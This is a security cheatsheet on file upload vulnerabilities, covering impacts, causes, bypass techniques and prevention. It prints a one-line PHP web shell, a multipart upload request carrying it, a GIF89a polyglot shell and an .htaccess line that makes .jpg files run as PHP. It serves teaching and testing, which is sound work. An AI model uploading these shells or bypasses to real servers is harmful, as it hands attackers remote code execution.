# 🔥 File Upload Vulnerabilities Cheatsheet

## 🎯 What Are File Upload Vulnerabilities?
File upload vulnerabilities occur when an application improperly validates, processes, or handles user-uploaded files, allowing attackers to upload malicious files to compromise a system.

---

## 💣 What Is the Impact of File Upload Vulnerabilities?

1. **Remote Code Execution (RCE):**
   - Uploading web shells (e.g., `shell.php`) or malicious scripts that execute on the server.
   - **Impact:** Full control over the server.

2. **Path Traversal Attacks:**
   - Exploiting improper file storage mechanisms to overwrite critical files.
   - Example: Uploading a malicious `.htaccess` file to override server behavior.

3. **Client-Side Attacks:**
   - Uploading malicious files like `.html` or `.js` to execute in a user's browser.
   - **Impact:** Cross-Site Scripting (XSS), phishing, or malware distribution.

4. **Denial of Service (DoS):**
   - Uploading large files to consume storage or processing resources.

5. **Sensitive Data Exposure:**
   - Attacker uploads files to access internal directories via predictable file storage mechanisms.

---

## ⚙️ How Do File Upload Vulnerabilities Arise?

1. **Unrestricted File Uploads:**
   - No validation on file type, size, or contents.
   - Example: Directly accepting uploaded files without sanitization.

2. **Flawed File Validation:**
   - Weak or client-side-only checks for:
     - File extensions (e.g., `.php.jpg` bypassing blacklists).
     - MIME types (`Content-Type` header).
     - File contents or magic bytes.

3. **Race Conditions in Upload Handling:**
   - Exploiting time gaps between file upload and validation to manipulate or replace files.

4. **Directory Traversal Exploits:**
   - Using crafted filenames to navigate outside the intended directory (`../../`).

5. **Insufficient Server Configuration:**
   - Improper settings in web servers (e.g., Apache, Nginx) enabling execution of uploaded files.

---

## 🌐 How Do Web Servers Handle Requests for Static Files?

1. **Default Behavior:**
   - Servers (like Apache or Nginx) map URLs to file paths on disk, directly serving static files such as images, CSS, and JavaScript.

2. **Execution Rules:**
   - Files with specific extensions (e.g., `.php`, `.asp`) may be executed as server-side scripts.
   - Malicious files placed in web-accessible directories (`/uploads`) can be exploited.

3. **Configurable Behavior:**
   - Upload directories may be misconfigured to allow executable content.
   - Overriding configurations via uploaded `.htaccess` or equivalent server files.

---

## 🔑 Exploitation Techniques

### 1. **Unrestricted File Uploads (Web Shell Deployment)**
- **Steps:**
  - Upload a web shell script (e.g., `shell.php`).
  - Access the uploaded file via the server's public directory.
  - Execute commands remotely using the web shell.
  
- **Example Payload (PHP Web Shell):**
  ```php
  <?php system($_GET['cmd']); ?>
  ```
- **Request Example:**
  ```http
  POST /upload HTTP/1.1
  Content-Type: multipart/form-data

  --boundary
  Content-Disposition: form-data; name="file"; filename="shell.php"

  <?php system($_GET['cmd']); ?>
  --boundary--
  ```

---

### 2. **Flawed File Validation**
- **Bypassing Content-Type Checks:**
  - Modify `Content-Type` to evade detection:
    ```http
    Content-Type: image/jpeg
    ```
  - Example: Uploading a PHP file disguised as an image.

- **Extension-Based Bypasses:**
  - Use double extensions (`file.php.jpg`) or trailing spaces (`file.php `).

- **Magic Byte Evasion:**
  - Start a malicious file with valid magic bytes for another format (e.g., `GIF89a`) to bypass content inspection.

---

### 3. **Overriding Server Configuration**
- **Steps:**
  - Upload `.htaccess` or equivalent files to alter server behavior.
  - Example: Enable PHP execution in `/uploads`:
    ```
    AddType application/x-httpd-php .jpg
    ```
- **Exploitation:**
  - Rename a PHP shell to `shell.jpg` and execute it on the server.

---

### 4. **Exploiting Race Conditions**
- **Steps:**
  - Upload a legitimate file.
  - Quickly replace it with a malicious file before validation is complete.

---

### 5. **Obfuscating File Extensions**
- **Techniques:**
  - Encode or obscure extensions:
    - Unicode encoding: `file.p%ef%bf%bdhp`
    - Trailing dots: `file.php.`
  - Exploit parsing inconsistencies in web servers or file libraries.

---

### 6. **Polyglot Web Shells**
- **What It Is:** Files that are valid in multiple formats.
- **Example:** Combine valid PHP and image content:
  ```php
  GIF89a
  <?php system($_GET['cmd']); ?>
  ```

---

## 🛠️ How to Prevent File Upload Vulnerabilities

1. **Strict Input Validation:**
   - Use an allowlist for permitted file types and extensions.
   - Verify MIME types and magic bytes server-side.

2. **Store Files Outside Web-Accessible Directories:**
   - Prevent direct access to uploaded files by storing them in non-public directories.

3. **Rename Uploaded Files:**
   - Rename files with random unique names to prevent path traversal.

4. **Set Correct Permissions:**
   - Deny execution rights for uploaded files.

5. **Validate File Contents:**
   - Inspect file headers and ensure files match expected formats.

6. **Limit File Sizes:**
   - Enforce a strict limit on file upload sizes to prevent DoS attacks.

7. **Avoid Relying on Blacklists:**
   - Blacklists are error-prone and can be bypassed.

8. **Disable Dangerous File Types in Configurations:**
   - Example for Apache:
     ```
     <Directory "/var/www/uploads">
       php_admin_flag engine Off
     </Directory>
     ```

---

## 🛠️ Tools for File Upload Testing

| Tool         | Purpose                           | URL/Command                           |
|--------------|-----------------------------------|---------------------------------------|
| Burp Suite   | Manual file upload testing        | [Burp Suite](https://portswigger.net) |
| OWASP ZAP    | Automated file upload scans       | [ZAP](https://www.zaproxy.org/)       |
| Metasploit   | Web shell exploits                | [Metasploit](https://www.metasploit.com) |
| ffuf         | Fuzzing for upload directories    | `ffuf -u URL -w wordlist`             |
| ExifTool     | Analyzing and manipulating files  | [ExifTool](https://exiftool.org/)     |
